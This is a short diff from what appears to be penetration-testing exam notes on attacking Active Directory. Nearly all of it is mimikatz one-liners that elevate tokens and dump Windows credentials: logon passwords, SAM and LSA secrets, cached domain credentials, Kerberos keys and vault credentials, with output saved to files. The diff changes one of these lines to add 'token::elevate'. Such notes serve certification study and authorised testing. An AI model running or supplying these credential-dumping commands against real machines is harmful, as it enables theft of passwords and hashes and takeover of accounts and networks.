@@ -116,7 +116,7 @@ https://www.reddit.com/r/oscp/comments/1ew7nqt/order_of_attacking_ad_set/
 ### Local (privilege::debug, sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here)
 
          ./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > dumped_pwds.txt
-         PS C:\users\public > mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt
+         PS C:\users\public > mimikatz.exe "token::elevate" "privilege::debug" "lsadump::sam" "exit" > sam.txt
          ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
 
 ## Dumping AD Domain Credentials
